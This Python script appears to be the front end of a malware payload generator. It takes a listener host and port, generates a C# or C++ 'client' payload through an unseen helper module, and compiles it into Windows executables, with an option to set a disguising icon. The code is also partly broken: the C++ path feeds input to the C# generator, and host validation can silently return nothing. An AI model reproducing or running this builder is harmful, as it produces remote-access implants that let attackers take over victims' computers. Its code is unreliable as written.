from lib.generate import *
import os
import re
import socket
def getlocal():
	hostname = socket.gethostname()
	local_ip = socket.gethostbyname(hostname)
	return local_ip
def ask(opt):
	opt = opt.lower()
	if opt == "lhost":
		opt = input("Enter Local Host :>")
		reg = r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
		if re.match(reg, opt):
				return opt
		else:
				print("{-} Please Specify A Correct Local Host {-}")
	elif opt == "lport":
		opt = input("Enter Local Port :>")
		return opt
def main():
	help = '''options (c# or c++")
	1. Method c#")
	2. Metohd c++")
	'''
	print(help)
	while True:
		menu = input("root@pleasesubscribe :>").lower()
		if menu == "1":
			local = getlocal()
			lcheck = input(f"would you like to use {local} as Host (y/n) ").lower()
			if lcheck == "y":
				lport = ask("lport")
				generate_csharp(local,lport)
				compile("payload/client_csharp.cs","c#")
		elif menu == "2":
			bytes = input("Please enter file with encoded bytes >:")
			with open(bytes,"r") as file:
				lines = file.read()
				generate_csharp(lines)
				compile("payload/client_cplus.cpp","c")
			#make sure you compile in windows becuase can not install on mac os
			print("please compile code on windows based machine.")
		elif menu == "help":
			print(help)
		elif menu == "exit":
			exit("Bye Kid!")
def compile(file,type):
	if type == "c#":
		print(f"\n{'='*36} RESULT {'='*36}\n")
		os.system(f"mcs {file}")
		print(f"Complied file as client_csharp.exe")
		os.remove(file)
		iconc = input("would you like to add icon? (y/n) :>").lower()
		if iconc == "y":
			#does not support on mac yet
			icon = f"wine rcedit.exe --set-icon icon/icon.ico {file}"
			#os.system(icon)
			print("{+} work in progress {+}")
	elif type == "c":
		print(f"\n{'='*36} RESULT {'='*36}\n")
		os.system(f"x86_64-w64-mingw32-gcc {file}")
		print(f"Complied file as client_c.exe")
		os.remove(file)
main()
